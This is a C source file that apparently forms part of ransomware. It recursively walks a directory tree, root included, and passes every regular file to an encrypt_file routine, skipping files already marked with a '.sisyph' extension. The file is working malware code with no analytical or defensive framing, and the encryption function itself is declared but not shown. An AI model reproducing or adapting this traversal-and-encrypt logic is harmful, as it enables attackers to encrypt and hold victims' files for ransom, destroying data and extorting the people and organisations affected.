#include <stdio.h>
#include <dirent.h>
#include <string.h>

#include "includes.h"
/**
 * DT_DIR is defined in the file <unistd.h>,
 * but it is not supported in ANSI C.
 */
#define DT_DIR  4
#define DT_FILE 8
/* The prototype file encryption function */
void encrypt_file(char *path);




bool is_file(struct dirent *entry) {
    return (entry->d_type == DT_FILE);
}


bool is_dir(struct dirent *entry) {
    return (entry->d_type == DT_DIR);
}


bool is_inode(struct dirent *entry) {
    return (
        (!strncmp(entry->d_name, ".", 1) && strlen(entry->d_name) == 1) ||
        (!strncmp(entry->d_name, "..", 2) && strlen(entry->d_name) == 2)
    );
}


bool is_root(char *path) {
    return (strlen(path) == 1 && strncmp(path, "/", 1) == 0);
}


bool already_encrypted(char *path) {
    /* CRYPT_EXT it is '.sisyph' */
    return strstr(path, CRYPT_EXT);
}



/**
 * Recursive function contents of the directory traversal
 */
int listdir(char *name, int depth) {
    DIR *dir = NULL;
    struct dirent *entry;

    if (!(dir = opendir(name))) {
        return 1;
    }

    if (!(entry = readdir(dir))) {
        return 1;
    }

    /* If the 'name' is the root directory '/' */
    if (is_root(name)) {
        name = "";
    }

    do {
        /* 'path' contains the absolute path to the found object. */
        char path[1024] = "";

        strcat(path, name);
        strcat(path, "/");
        strcat(path, entry->d_name);

        if (already_encrypted(path)) {
#ifdef DEBUG
            printf("Encrypted: '%s'\n", path);
#endif
            continue;
        }
        else if (is_inode(entry)) {
#ifdef DEBUG
            printf("Node: %s\n", path);
#endif
            continue;
        }
        else if (is_dir(entry)) {
#ifdef DEBUG
            printf("Catalog: %s\n", path);
#endif
            listdir(path, depth + 1);
        }
        else if (is_file(entry)) {
#ifdef DEBUG
            printf("File: '%s'\n", path);
#endif
            encrypt_file(path);
        }
    } while ((entry = readdir(dir)));

    closedir(dir);
    return 0;
}